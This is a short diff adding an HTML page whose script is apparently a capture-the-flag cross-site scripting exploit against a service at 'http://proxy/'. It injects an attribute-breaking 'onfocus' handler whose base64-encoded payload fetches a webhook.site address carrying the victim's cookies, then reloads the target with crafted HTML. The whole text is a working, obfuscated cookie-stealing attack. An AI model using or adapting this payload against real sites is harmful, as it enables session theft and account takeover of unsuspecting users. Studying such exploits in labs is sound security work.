@@ -1,0 +1,21 @@
+<input name="test" value="" />
+
+<script>
+	const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+	(async () => {
+		await sleep(100);
+		document.location = "http://proxy/";
+
+		input = document.querySelector("input");
+		input.value =
+			" autofocus onfocus=eval(atob(`ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU4MTIwMDdhLTkwZDItNDA3OC1hZDVkLTc3MjNiYWRhN2E1MC8nK2J0b2EoZG9jdW1lbnQuY29va2llKSk=`)) shikanoko nokonoko koshitantan";
+		input.dispatchEvent(new Event("change"));
+
+		window.stop();
+		await sleep(1000);
+
+		document.location =
+			"http://proxy/?html=%3Cinput+id%3D%22test%22+class%3D%22value%3D%22+name%3D%22test%22%3E"; // <input id="test" class="value=" name="test">
+	})();
+</script>
